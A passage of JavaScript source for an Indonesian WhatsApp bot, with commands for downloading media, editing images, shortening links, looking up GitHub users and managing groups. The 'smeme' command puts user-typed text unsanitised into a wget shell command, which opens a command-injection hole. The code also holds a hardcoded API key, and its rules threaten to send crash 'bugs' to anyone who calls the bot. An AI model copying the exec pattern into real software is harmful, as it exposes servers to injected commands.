*▸* Group Chat : ${groups.length}
*▸* Total Chat : ${totalchat.length}
*▸* Speed : ${latensi.toFixed(4)} second
*▸* Penggunaan Ram : ${ram2}
*▸* Hostname : ${os.hostname()}
*▸* Platform : ${os.platform()}
*▸* Device Model: ${device_model}
*▸* Device Manufactur : ${device_manufacturer}
*▸* Wa Version: ${wa_version}
*▸* Os Version: ${os_version}
*▸* Owner : ${nomerOwner}
*▸* Tgl pembuatan : 25 Juli 2021
*▸* Tgl release : 29 September 2021
*▸* Tgl sekarang : ${calender}
*▸* Image : Girl Front Line G11
*▸* Voice : Nina kawai

*▸* SCRIPT BY
   Decode Denpa
   X-Dev Team
   Yogi PW
   Hexagon
   Dttaz

*▸* FEATURE  BY  
   Decode Denpa
   Fernazer
   X-Dev Team
   Resta Gamteng
   Zeeone Ofc
   X-Dev Team
   Yudha perdana
   Xchilds
   Dika Ardnt
`
let info = fs.readFileSync('./stik/bot.jpg')
let options2 = {contextInfo: { forward, externalAdReply:{title:`${ucapanWaktu} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail: fs.readFileSync('./stik/bot.jpg'), mediaUrl:`https://www.instagram.com/reel/CZ2bMRkgHCR/?utm_medium=copy_link`}}}
let gbutsan = [{buttonId: 'YOUTUBE', buttonText: {displayText: `ʏᴏᴜᴛᴜʙᴇ`}, type: 1},
{buttonId: 'RULES', buttonText: {displayText: `ʀᴜʟᴇs`}, type: 1}]         
xdev.sendButImage(from, menunya, `Baterai : error\n© Extream`, fs.readFileSync('./stik/bot.jpg'), gbutsan)      
} 
break 


case 'tomp4':
if (isQuotedSticker) {
setReply(mess.wait)
let file = await xdev.downloadAndSaveMediaMessage(quoted)
let outGif = `./temp/${getRandom('.gif')}`
let outMp4 = `./temp/${getRandom('.mp4')}`
//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
 }      
await xdev.sendMessage(from,{video: fs.readFileSync(outMp4), caption: "Nih"},{quoted: dev})
 fs.unlinkSync(outGif)
 fs.unlinkSync(outMp4)
 fs.unlinkSync(file)
})
}) 

}
break


case 'attp':
 try {
if (args.length == 0) return setReply(`Example: ${prefix + command} YUxdev`)
//let buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
await xdev.sendMessage(from, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: dev })
} catch (e) {
 console.log(e)
 setReply(`Maap sedang error coba lagi besok`)            
}
break
              
            
case 'spotify':
    if (args.length == 0) return reply(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
    axios.get(`https://api.lolhuman.xyz/api/spotify?apikey=ELAINA&url=${args[0]}`).then(({ data }) => {
        var caption = `Title : ${data.result.title}\n`
        caption += `Artists : ${data.result.artists}\n`
        caption += `Duration : ${data.result.duration}\n`
        caption += `Popularity : ${data.result.popularity}\n`
        caption += `Preview : ${data.result.preview_url}\n`
         xdev.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
            xdev.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3`, ptt: true })
        })
    })
    break
              


	
case 'scmp3':{
if(!q) return setReply("Masukan Link")
if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
let nana = q.replace('https://m.', 'https://')
setReply("*Downloading...*")
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(nana);
let menit = Math.round(track.full_duration/1000/60)
if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
scdlMp3(nana)
}
break
 
case 'scdoc':{
if(!q) return setReply("Masukan Link")
if(q.includes("social_sharing")) return setReply("Masukan link dengan benar")
let nana = q.replace('https://m.', 'https://')
setReply("*Downloading...*")
let scdl = await SoundCloud.create();
let track = await scdl.tracks.getTrack(nana);
let menit = Math.round(track.full_duration/1000/60)
if(menit > 10) return setReply("Tidak bisa mendownload musik lebih dari 10 menit")
scdlDoc(nana)
}
break
 
 
case 'scsearch':
if(!q) return setReply("Masukan link")
let scdl = await SoundCloud.create();
let result = await scdl.search({
query: q,
limit: 15, 
offset: 0, 
filter: 'tracks' 
});

let teks =`*SOUNDCLOUD SEARCH*`

for (let res of result.collection){
teks +=`

📂 Judul : ${res.title}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
🌐 Url : ${res.permalink_url}

═════════════════
`
} 

teks +=`_Thanks for choosing SoundCloud_`

try{
let anuah = result.collection[0].artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
let nano = [
{"buttonId": `${prefix}scmp3 ${result.collection[0].permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${result.collection[0].permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]

//xdev.xdev.sendButImage (from, teks, © ${fake1}, yamiyami, nano)
 break
  
  
case 'playmusic':
{
if(!q) return setReply("Masukan judul lagu")
setReply(mess.wait)
if(q.startsWith("https://")){
let nana = q.replace('https://m.', 'https://')
let scdl = await SoundCloud.create();
let res = await scdl.tracks.getTrack(nana)
console.log(res)
let teks =`
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`
try{
let anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
let nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]

xdev.sendButImage(from, teks, copyright, yamiyami, nano, {contextInfo: forward}) 

} else {

let scdl = await SoundCloud.create();
let result = await scdl.search({
  query: q,
  limit: 20, 
  offset: 0, 
  filter: 'tracks' 
});

let res = result.collection[0] 

try{
var artis = res.publisher_metadata.artist
var album = res.publisher_metadata.album_title
} catch (err){
var artis = res.user.full_name
var album = "Tidak ada"
}
console.log(res)
let teks =`
*SOUNDCLOUD DOWNLOADER*

📂 Judul : ${res.title}
👤 Artis : ${artis}
💽 Album : ${album}
⏰ Durasi : ${Math.round(res.full_duration/1000/60)} Menit
◀️ Diputar : ${h2k(res.playback_count)} kali
❤️ Disukai : ${h2k(res.likes_count)}
🌏 Release : ${res.release_date}
♻️ Repost : ${h2k(res.reposts_count)}
🔈 Format : ${res.track_format}
`

try{
let anuah = res.artwork_url.replace('large', 'crop')
var yamiyami = await getBuffer(anuah)
} catch(err) {
let anuh ="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA&usqp=CAU"
var yamiyami = await getBuffer(anuh)
}
let nano = [
{"buttonId": `${prefix}scmp3 ${res.permalink_url} `,"buttonText": {"displayText": `ᴀᴜᴅɪᴏ`},"type": "RESPONSE"},
{"buttonId": `${prefix}scdoc ${res.permalink_url}`,"buttonText": {"displayText": `ᴅᴏᴄᴜᴍᴇɴᴛ`},"type": "RESPONSE"}
]
xdev.sendButImage(from, teks, copyright, yamiyami, nano, {contextInfo: forward}) 
}
}
break



case  'ig':{
  if(!q) return setReply("Masukan Link")
setReply(mess.wait)
if (!args[0].match(/https:\/\/www.instagram.com\/(p|reel|tv)/gi)) return setReply( `Link salah! Perintah ini untuk mengunduh postingan ig/reel/tv, bukan untuk highlight/story!\n\ncontoh:\n${prefix + command} https://www.instagram.com/p/BmjK1KOD_UG/?utm_medium=copy_link`)

let igreel = q.includes("https://www.instagram.com/reel/")
let results = await instagramdlv3(args[0])
//Log(results)
for (const { url } of results) await xdev.sendMedia(from, url, dev, {caption: "Nih"})
}
break


	
case 'kodepos':
try{
let nana = await kodepos(q)
console.log(nana)
let teks =`Berikut Daftar kode pos\nYang telah di temukan\n\n`
for (let i of nana){
 teks +=`Provinsi: ${i.province}\nKota: ${i.city}\nKecamatan: ${i.subdistrict}\nKabupanten: ${i.urban}\nKode Pos: ${i.postalcode}\n\n═════════════════\n\n`
}
setReply(teks)
} catch (err){
setReply("Kodepos tidak di temukan")
console.log(err)
}
break  
  
  
case 'ghstalk':{
let nana = await ghstalk(q)
console.log(nana)
let foto = nana.avatar_url
let gambar = await getBuffer(foto)
console.log(foto)
let toks =`
Nama: ${nana.name}
Bio: ${nana.bio}
Followers: ${nana.followers}
Following: ${nana.following}
Repository: ${nana.public_repos}
Created at: ${nana.created_at}
Update at: ${nana.updated_at}
Twitter: ${nana.twitter_username}
Email: ${nana.email}
Lokasi: ${nana.location}
Website: ${nana.blog}
Github url: ${nana.url}
`
console.log(toks)
await xdev.sendMessage(from, {image:gambar, caption: toks},{quoted: dev})
//await xdev.sendMedia (from, foto, dev, {caption: toks})
}
break
			
case 'gimage':{
if (args.length < 1) return setReply('Apa Yang Mau Dicari?')
try{
googleImage(q).then(async (data) => {
//console.log(data)
let foto = data[Math.floor(Math.random() * data.length)]
if(data.length == "0") return setReply("Image tidak di temukan")
setReply(mess.wait)
xdev.sendMedia (from, foto, dev, {caption: "Nih"})
})
} catch(err){
let teks = args.join(' ')
let res = await gis(teks, google)
function google(error, result){
if (error){ return setReply('_[ ! ] Error Terjari Kesalahan Atau Hasil Tidak Ditemukan_')}
else {
var gugIm = result
var random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
xdev.sendMedia (from, random, dev, {caption:  `*Hasil Pencarian Dari :* ${teks}`})
}
}
}
}

break
			
		




	
	
	


		
		

	
	

		
case '3000years':
case 'approved':
case 'wanted':
case 'utatoo':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'greyscale':
case 'glitch':
case 'gay':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
if (isQuotedImage) {
try{
setReply(mess.wait)
let ahah = await xdev.downloadAndSaveMediaMessage(quoted)
let owgi = await TelegraPh(ahah)
let ini_gen = `${command}`
ameApi.generate(ini_gen, { url : owgi}).then(gambar => {
xdev.sendMessage(from, {image: gambar, caption: "Nih"  }, {quoted: dev})
fs.unlinkSync(ahah) 
})
}catch(err){
console.log(err)
}
} else if (isQuotedTag || isQuotedReply) {
setReply(mess.wait)
let ghost = users 
let oppp = await xdev.profilePictureUrl(ghost, 'image').catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
let ini_gen = `${command}`
ameApi.generate(ini_gen, {
url : oppp
}).then(gambar => {
xdev.sendMessage(from, {image: gambar, caption: "Nih" }, {quoted: dev})
}).catch(err => {
setReply(`${err}`)
});    
} else {
setReply("Tag atau Reply targetnya")
}
break



case 'mediafire':{

if(q.startsWith("https://www.mediafire.com")){
let nana = await mediafiredl(q)
if(nana.filename == "") return setReply("Error itu bukan file, kalo ga tau cara make mediafire mending ga usah make") 
console.log(nana)
let tuks =`
Data succesfull obtained

File Name : ${nana.filename}
File Size : ${nana.filesizeH}
Upload : ${nana.aploud}
`
await setReply(tuks)
if(nana.filesize > 50000 && !isOwner){
if(sender.startsWith("62")){
let tuks = "Kamu telah di banned\nkarena menyalah gunakan\nfitur mediafire!"
} else {
let tuks = "You have been banned\nfor abusing the mediafire feature"
}
addBanned(pushname,calender, senderNumber, ban) 
await setReply("File size melebihi batas,\nbatas yang di tentukan adalah 50mb")              
await setReply(tuks)
return
}
await xdev.sendMedia (from, nana.url, dev, {fileName: nana.filename})

} else{
setReply("Link Invalid")
}
}
break



case 'tinyurl':{
if (args.length < 1) return setReply(`Masukkan link`)
if (!isUrl) return setReply(`Masukkan link`)
const fetchText = (url, optiono) => {
return new Promise((resolve, reject) => {
return fetch(url, optiono)
.then(response => response.text())
.then(text => resolve(text))
.catch(err => {
console.log(color(err,'red'))
reject(err)
})
})
}
let okok = await fetchText(`https://tinyurl.com/api-create.php?url=${q}`)
let shorti = `*Result : ${okok}*`
setReply(shorti)
}
break  


case 'bitly':{
if(!q) return setReply("Masukan link")
if(!isUrl) return setReply("Masukan link dengan benar")
try {
let result = await bitly.shorten(q);
setReply(`Link: ${result.link}\nCreated at: ${result.created_at}`)
} catch(e) {
setReply(`Url invalid`)
}
}
break;



case 'githubdl':{
if(!q.includes("|")) return setReply(`Contoh ${prefix}${command}githubdl username|repository`)
let url = `https://github.com/${q.split("|")[0]}/${q.split("|")[1]}/archive/refs/heads/master.zip`
//ByRizkyAdi
console.log("Done")
setReply(`Waiting for compress to zip`)
await xdev.sendMedia (from, url, dev, {fileName: q.split("|")[1]})
}
break 
  
  
  
case 'gitclone':
try{
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return setReply( 'link githubnya mana? contoh: https://github.com/saipulanuar/v18 ')
if (!regex.test(q)) return setReply('link salah!')
let [, user, repos] = q.match(regex) || []
let repo = repos.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repos}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
// 'attachment; filename=ilmanhdyt/ShiraoriBOT-Mdv2.5.1-251-g836cccd.zip'
setReply(`*Mohon tunggu, sedang mengirim repository..*`)
await xdev.sendMedia (from, url, dev, {fileName: filename})
} catch (err){
setReply(mess.error.link)
}
break  


case 'google':{
if (!q) return setReply('masukan teks')
if(q == undefined || q == ' ') return setReply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
let ggs = require('google-it')
 ggs({ 'query': q }).then(results => {
let vars =``
vars += `_*Hasil Pencarian : ${q}*_\n`
for (let i = 0; i < results.length; i++) {
vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
}
var lama = vars.trim()
setReply(lama)
})
}
break


case 'closetime': 
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Close time ${q} dimulai dari sekarang`)
setTimeout( () => {
var nomor = dev.participant
const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
xdev.groupSettingUpdate(from, 'announcement')
setReply(close)
}, timer)
break
				
				
case 'opentime':        
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.badmin)
if (args[1]=="detik") {var timer = args[0]*`1000`
} else if (args[1]=="menit") {var timer = args[0]*`60000`
} else if (args[1]=="jam") {var timer = args[0]*`3600000`
} else if (args[1]=="hari") {var timer = args[0]*`86400000`
} else {return setReply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setReply(`Open time ${q} dimulai dari sekarang`)
setTimeout( () => {
var nomor = dev.participant
const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
xdev.groupSettingUpdate(from, 'not_announcement')
setReply(open)
}, timer)
break


case 'tourl': {
setReply(mess.wait)
let { UploadFileUgu} = require('../lib/uploader')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
if (isQuotedImage) {
let anu = await TelegraPh(media)
setReply(util.format(anu))
} else if (isQuotedVideo || isQuotedAudio || isQuotedSticker) {
let anu = await UploadFileUgu(media)
setReply(util.format(anu))
}
await fs.unlinkSync(media)
}
break


case 'ytmp3':
{
if(!q) return setReply("Masukan link youtube")
if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply("*Scrapping...*")
let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}
 let link =`https://youtube.com/watch?v=${videoId}` 
 let anu = await yts(link)
 if(anu.all.length == "0") return setReply("Musik tidak di temukan")
 try{
var foto = `https://i.ytimg.com/vi/${videoId}/hqdefault.jpg`
} catch (err){
var foto = anu.all[0].image
}
 
try{
let info = await ytdl.getInfo(link);
let format = ytdl.filterFormats(info.formats, 'audioonly');
if(Number(format.contentLength) > 20000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE AUDIO DOWNLOADER*

📂 Title : ${info.videoDetails.title}
📄 Size : ${FileSize(format[0].contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
📊 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
👤 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await xdev.sendMessage(from, {image: {url: foto}, caption: teks},{quoted: dev})
downloadMp3(q) 
  } catch(err){
setReply(err)
}
//limitAdd(senderNumber, user)
}
break
	
	
	
case 'ytmp4':
 try{
 if (q.includes("https://youtube.com/channel/")) return setReply("Goblok itu bukan link vidio bangsat")
setReply("*Scrapping...*")

if(q.includes("https://youtu.be/")){
var videoId = q.replace('https://youtu.be/', '')
} else if(q.includes("https://youtube.com/watch?v=")){
var videoId = q.split('=')[1]
} else if(q.includes("https://youtube.com/shorts/")){
var videoId = q.replace('https://youtube.com/shorts/', '')
}  else {
return setReply("Link salah")
}

 let link =`https://youtube.com/watch?v=${videoId}`
let anu = await yts(link)
if(anu.all.length == "0") return setReply("Video tidak di temukan")
let info = await ytdl.getInfo(link);
let format = ytdl.chooseFormat(info.formats, { quality: '18' });
if(Number(format.contentLength) > 40000000 ) return setReply(`Bjir sizenya ${FileSize(format.contentLength)}\nAu ah ga mao download 😤`)

let teks =`*YOUTUBE VIDEO DOWNLOADER*

📂 Title : ${anu.all[0].title}
💾 Ext : 360p
📄 Size : ${FileSize(format.contentLength)}
🆔 ID : ${videoId}
⏲️ Duration : ${anu.all[0].timestamp}
🌎 Viewers : ${h2k(anu.all[0].views)}
🌐 Upload At : ${anu.all[0].ago}
🔖 Author : ${anu.all[0].author.name}
📹 Channel : ${anu.all[0].author.url}
🔗 Url : ${anu.all[0].url}
📝 Description : ${anu.all[0].description}`
await xdev.sendMessage(from, {image: {url: anu.all[0].image}, caption: teks},{quoted: dev})
downloadMp4(q) 
  } catch(err){
setReply(`${err}`)
}
break
	

case 'loli': case 'milf': case 'husbu': case 'cosplay': case 'wallml':{
if (isGroup) return setReply('fitur tidak dapat di gunakan di group')
let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
let kentir = await getBuffer(wipi)
let teks = "Nih"                                          
let buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}owner`,buttonText:{displayText:'🐤OWNER'},type:1}]                            
xdev.sendButImage(from, teks, copyright, kentir, buttons, {quoted: dev})      
 }
break  

case 'chat': {
if (!isOwner && !isPremium) return setReply(mess.only.prem)
if (!q) return setReply( 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
if (args[0] === 'mute') {
xdev.chatModify({ mute: 'Infinity' }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unmute') {
xdev.chatModify({ mute: null }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'archive') {
xdev.chatModify({  archive: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
xdev.chatModify({ archive: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'read') {
xdev.chatModify({ markRead: true }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'unread') {
xdev.chatModify({ markRead: false }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (args[0] === 'delete') {
xdev.chatModify({ clear: { message: { id: dev.quoted.id, fromMe: true }} }, from, []).then((res) => setReply(jsonformat(res))).catch((err) => setReply(jsonformat(err)))
} else if (q.startsWith("+") || q.startsWith('08') || q.startsWith('62') ){
if (args[0].startsWith('08')) return setReply('Awali nomor dengan 62') 
var nomor = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") 
var org = q.split("|")[1];
xdev.sendMessage(nomor+'@s.whatsapp.net',{text: org})   
setReply(`Sukses mengirim chat:\n${org} ke nomer ${nomor}`)           
 }
 }
 break


case 'smeme': {
if(!q) return setReply(`Masukan teks, contoh : ${prefix}smeme teks|teks`)
var top = q.split('|')[0] ? q.split('|')[0] : ''
var bottom = q.split('|')[1] ? q.split('|')[1] : ''           
if (isQuotedImage ) {
setReply(mess.wait)

try{
let { Sticker, StickerTypes } = require('wa-sticker-formatter')
let olalah = await xdev.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let media = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
await makeSticker(media,Sticker, StickerTypes)
await fs.unlinkSync(olalah)

} catch (err){
let olalah = await xdev.downloadAndSaveMediaMessage(quoted)
let anuah = await TelegraPh(olalah)
let ranp = getRandom('.gif')
let rano = getRandom('.webp')
let anu2 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${anuah}`
exec(`wget ${anu2} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, async (err) => {
if (err) return setReply(`${err}`)
await xdev.sendMessage(from,{sticker: fs.readFileSync(rano)}, {quoted: dev})
await fs.unlinkSync(rano)
await fs.unlinkSync(ranp)
})
}
} else {
setReply('Gunakan foto!')
}
}
break    









case 'rules':{
let teks =`
Syarat dan Ketentuan menggunakan *${fake}*

1. Nama dan nomer user ${fake}
     akan Kami simpan di dalam 
     server selama bot aktif
     
2. Data akan di hapus ketika bot Offline
     atau di hapus oleh Owner Bot

3. Kami tidak menyimpan gambar, 
     video, file, audio, dan dokumen 
     yang kamu kirim ke ${fake}
     
4. Kami tidak akan pernah meminta users 
     untuk memberikan informasi pribadi
     
5. Jika menemukan Bug/Error silahkan 
     langsung lapor ke Owner atau Developer
     atau bisa juga memakai fitur _*reportbug*_
     
6. Beberapa fitur mungkin ada yang error, 
     jadi tunggu sampai developer 
     meperbaiki fitur tersebut
         
8. Bot ini sudah di lengkapi dengan
     fitur _*Auto Report Bug*_ jika terjadi
     error maka bot akan auto report ke
     developer, terkecuali error yang
     menyebabkan bot mati, maka user
     harus lapor ke developer
     
7. Bot ini juga sudah di lengkapi dengan 
     Fitur Anti Spam jika kamu terdeteksi 
     melakukan spam, maka Bot tidak
     akan menanggapi kamu selama 20 detik
    
9. User dilarang keras menelpon bot!
     jika melanggar maka kamu akan terkena 
     banned,block dan dikirim bug

10. Bot tidak akan menanggapi user yang
       meminta untuk di save nomernya`

let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
                    {"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"}]
                    
xdev.sendButImage(from, teks, `© Extream`, fs.readFileSync('./stik/bot.jpg'), mok, {quoted: dev})             
}
break
  


case 'kodebahasa':{
let LANGUAGES = `
*╭─❲ KODE BAHASA ❳*
*│*
*│▸* af: Afrikaans 
*│▸* sq: Albanian
*│▸* ar: Arabic
*│▸* hy: Armenian
*│▸* ca: Catalan 
*│▸* zh: Chinese 
*│▸* zh-cn: Chinese (Mandarin/China)
*│▸* zh-tw: Chinese (Mandarin/Taiwan)
*│▸* zh-yue: Chinese (Cantonese)
*│▸* hr: Croatian
*│▸* cs: Czech
*│▸* da: Danish
*│▸* nl: Dutch
*│▸* en: English    
*│▸* en-au: English (Australia)
*│▸* en-uk: English (United Kingdom)
*│▸* en-us: English (United States) 
*│▸* eo: Esperanto 
*│▸* fi: Finnish 
*│▸* fr: French
*│▸* de: German
*│▸* el: Greek 
*│▸* ht: Haitian Creole 
*│▸* hi: Hindi 
*│▸* hu: Hungarian 
*│▸* is: Icelandic 
*│▸* id: Indonesian 
*│▸* it: Italian
*│▸* ja: Japanese
*│▸* ko: Korean
*│▸* la: Latin
*│▸* lv: Latvian
*│▸* mk: Macedonian
*│▸* no: Norwegian
*│▸* pl: Polish
*│▸* pt: Portuguese
*│▸* pt-br: Portuguese (Brazil)
*│▸* ro: Romanian
*│▸* ru: Russian
*│▸* sr: Serbian
*│▸* sk: Slovak
*│▸* es: Spanish 
*│▸* es-es: Spanish (Spain)
*│▸* es-us: Spanish (United States)
*│▸* sw: Swahili
*│▸* sv: Swedish
*│▸* ta: Tamil
*│▸* th: Thai
*│▸* tr: Turkish
*│▸* vi: Vietnamese 
*│▸* cy: Welsh
*│*
*╰────────────⦁*`
setReply(LANGUAGES)
}
break
           // ghstalk

case 'kbbi':{
if (args.length < 1) return setReply('Apa yang mau dicari um?')
let asw = await fetchJson(`https://mnazria.herokuapp.com/api/kbbi?search=${body.slice(6)}`, {method: 'get'})
setReply('Menurut Kbbi:\n\n'+asw.result)
}
break

case 'block':
if (!isOwner) return onlyOwner()
if(isGroup){

if(users){
await xdev.updateBlockStatus(users, "block")
setReply(`Sukses block user`)
} else {
setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return setReply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await xdev.updateBlockStatus(woke, "block")
} else if(!q){
setReply("Masukan nomer yang ingin di block")
}
setReply(`Berhasil Block user ${woke.split("@")[0]}`)
}
break

case  'unblock':
if (!isOwner) return onlyOwner()
if(isGroup){
if(users){
await xdev.updateBlockStatus(users, "unblock")
await setReply(`Sukses unblock user`)
} else if(!q){
setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
let woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return setReply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return setReply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await xdev.updateBlockStatus(woke, "unblock")
setReply(`Sukses unblock ${woke}`)
} else if(!q){
setReply("Masukan nomer yang ingin di unblock")
}

}
break


case 'igstory': {
if (!q) return setReply( `*Perintah ini untuk mengunduh postingan instagram story*\n\nContoh:\n${prefix + command} alinursetiawan24`)
let res = await fetch(`https://megayaa.herokuapp.com/api/igstori?username=${q}`)
if (!res.ok) return setReply('Error')
let json = await res.json()
if (!json.status) return setReply(json)
await setReplty('Sedang di proses..')
for (let { url, type } of json.data) {
await delay(2000)
xdev.sendMedia (from, url, dev, {caption: "Nih"})      
}
}
break
case 'console':{
if (!isOwner) return onlyOwner()
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (Console === true) return setReply('Udah aktif kak')
Console = true
let ih =`Tampilan console telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
 if (Console === false) return setReply('Udah off kak')
Console = false
let eh =`Mode auto respon telah di matikan`
setReply(eh)
}else if (!q) {
xdev.sendButMessage(from, `MODE AUTOREAD`, `Silahkan pilih salah satu`, [
